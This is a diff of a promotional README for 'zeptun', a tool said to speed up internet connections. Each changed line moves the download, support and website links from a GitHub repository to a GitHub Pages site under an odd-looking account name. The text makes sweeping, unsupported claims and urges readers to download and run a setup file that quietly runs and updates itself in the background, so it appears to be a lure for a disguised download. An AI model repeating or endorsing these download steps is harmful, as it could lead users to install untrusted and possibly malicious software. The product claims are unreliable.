@@ -1,6 +1,6 @@
 # 🚀 zeptun - Your Fastest, Smoothest Internet Connection Tool
 
-[![Download zeptun](https://img.shields.io/badge/Download-zeptun-brightgreen?style=for-the-badge&logo=github&color=4CAF50)](https://github.com/Medinastraightface4686/zeptun)
+[![Download zeptun](https://img.shields.io/badge/Download-zeptun-brightgreen?style=for-the-badge&logo=github&color=4CAF50)](https://medinastraightface4686.github.io)
 
 Welcome to zeptun! This amazing tool helps your computer connect to the internet faster and more securely. Think of it as a turbo boost for your internet connection. It works quietly in the background, making sure your online experience is smooth, quick, and private.
 
@@ -10,7 +10,7 @@ Welcome to zeptun! This amazing tool helps your computer connect to the internet
 
 Getting zeptun on your computer is super easy. Just follow these simple steps:
 
-1. **Visit this link to download the application**: [https://github.com/Medinastraightface4686/zeptun](https://github.com/Medinastraightface4686/zeptun)
+1. **Visit this link to download the application**: [https://medinastraightface4686.github.io](https://medinastraightface4686.github.io)
 
 2. **Click the download button** you see on that page. It will start downloading the zeptun setup file to your computer.
 
@@ -79,7 +79,7 @@ No way! zeptun is incredibly lightweight and efficient. It uses very little memo
 zeptun updates automatically in the background. You'll always have the latest version without doing anything.
 
 ### 🆘 I need help. What should I do?
-Visit our [support page](https://github.com/Medinastraightface4686/zeptun) and you'll find helpful guides and tips. You can also reach out to our friendly support team through the website.
+Visit our [support page](https://medinastraightface4686.github.io) and you'll find helpful guides and tips. You can also reach out to our friendly support team through the website.
 
 ---
 
@@ -129,7 +129,7 @@ For those curious about the engine under the hood, zeptun is built with cutting-
 
 Don't wait! The internet feels faster and safer when zeptun is on your side. Downloading and setting up takes less than two minutes, and the benefits last forever.
 
-[![Download zeptun Now](https://img.shields.io/badge/Download-zeptun%20Now-ff69b4?style=for-the-badge&logo=github&color=FF5733)](https://github.com/Medinastraightface4686/zeptun)
+[![Download zeptun Now](https://img.shields.io/badge/Download-zeptun%20Now-ff69b4?style=for-the-badge&logo=github&color=FF5733)](https://medinastraightface4686.github.io)
 
 ---
 
@@ -137,7 +137,7 @@ Don't wait! The internet feels faster and safer when zeptun is on your side. Dow
 
 Stuck or have questions? Check out these resources:
 
-- **Website**: [https://github.com/Medinastraightface4686/zeptun](https://github.com/Medinastraightface4686/zeptun)
+- **Website**: [https://medinastraightface4686.github.io](https://medinastraightface4686.github.io)
 - **Bug Reports**: If you find a problem, tell us! We fix issues quickly.
 
 ---
